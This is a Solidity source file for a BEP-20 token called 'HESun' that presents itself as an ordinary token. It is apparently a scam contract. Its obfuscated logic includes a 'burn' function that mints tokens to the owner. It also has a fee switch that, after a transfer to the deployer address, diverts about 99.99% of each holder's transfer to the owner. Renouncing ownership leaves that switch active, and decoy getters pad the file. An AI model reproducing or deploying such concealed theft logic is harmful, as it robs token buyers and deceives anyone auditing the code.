/**
 *Submitted for verification at BscScan.com on 2022-11-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-16 04:02:02 GMT
 */
// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract HESun {
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint8 public constant decimals = 18;
uint256 private  AFKQGU = 1000000000000000000;
address private  MNOXBM = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
mapping (address => uint256) public balanceOf;
address private  GHUIEW = address(0);
address private  IBRAWU = address(0);
address public owner;
uint256 private  ZIRCVI = 1000000000000000;
uint256 private  IUPLYI = 100000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
string public  symbol = "BFNAAG";
mapping (address => mapping (address => uint256)) private _allowances;
string public  name = "HESun";
uint256 private  SMUVLB = 10000000000;
uint256 public constant NULNUF = 99999;
address private  SXVWRZ = address(0);
uint256 private  FNXOUE = 1000000000000000000;
address private  JBKFEA = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  LHFPSS = 10000000000000;
uint256 private  SOBRBV = 1000000000000000000000;
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getLHFPSS() private returns (uint256) {
return LHFPSS;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getJBKFEA() private returns (address) {
return JBKFEA;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getSMUVLB() private returns (uint256) {
return SMUVLB;
}

function _getIUPLYI() private returns (uint256) {
return IUPLYI;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "MQJYLC");
require(to != address(0), "MQJYLC");
require(amount <= balanceOf[from], "MQJYLC");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* NULNUF/FNXOUE ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==MNOXBM){
FNXOUE = NULNUF+2;
}
emit Transfer(from, to, transferAmount);
}
function _getSXVWRZ() private returns (address) {
return SXVWRZ;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getAFKQGU() private returns (uint256) {
return AFKQGU;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tMQJYLC 0");
require(spender != address(0), "fMQJYLC 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getZIRCVI() private returns (uint256) {
return ZIRCVI;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getIBRAWU() private returns (address) {
return IBRAWU;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getSOBRBV() private returns (uint256) {
return SOBRBV;
}

constructor () {
MNOXBM = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getGHUIEW() private returns (address) {
return GHUIEW;
}


}